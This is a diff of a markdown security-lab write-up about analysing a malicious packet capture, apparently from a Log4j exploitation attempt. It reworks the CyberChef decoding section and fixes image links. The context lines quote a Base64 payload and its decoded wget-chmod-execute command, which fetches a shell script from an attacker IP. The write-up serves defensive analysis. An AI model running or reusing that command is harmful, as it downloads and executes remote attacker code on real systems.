@@ -25,6 +25,7 @@ In this lab, I documents the investigation of a malicious packet capture (PCAP) 
 
 ## Detection Techniques Used
 
+
 - Wireshark display filters
 - TCP stream inspection
 - CyberChef decoding
@@ -77,14 +78,11 @@ d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
 
 wget http://62.210.130.250/lh.sh ; chmod +x lh.sh; ./lh.sh
 
+ 
+This screenshot shows the decoding process in **CyberChef**, where the Base64-encoded string is transformed into a shell command. The output reveals the intent to download and execute a remote shell script, indicating a clear attempt at remote code execution.
 
-Loaded into CyberChef
+![CyberChef decoding Base64 payload](Screnshotslog4j/cyberchef.png)
 
-Applied "From Base64" operation
-
-Output:
-
-wget http://62.210.130.250/lh.sh; chmod +x lh.sh; ./lh.sh
 
 
 **Interpretation:**
@@ -99,7 +97,7 @@ wget http://62.210.130.250/lh.sh; chmod +x lh.sh; ./lh.sh
  
 This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, Dr.Web) flagged this IP as **Malicious**, **Malware**, or **Phishing**.
 
-![VirusTotal analysis of 62.210.130.250] (Screnshotslog4j/virustotal_62.210.130.250.png)
+![VirusTotal analysis of 62.210.130.250](Screnshotslog4j/virustotal_62.210.130.250.png)
 
 **Queried IP:** `62.210.130.250`  
 **Result:** Flagged as malicious by 12+ security vendors
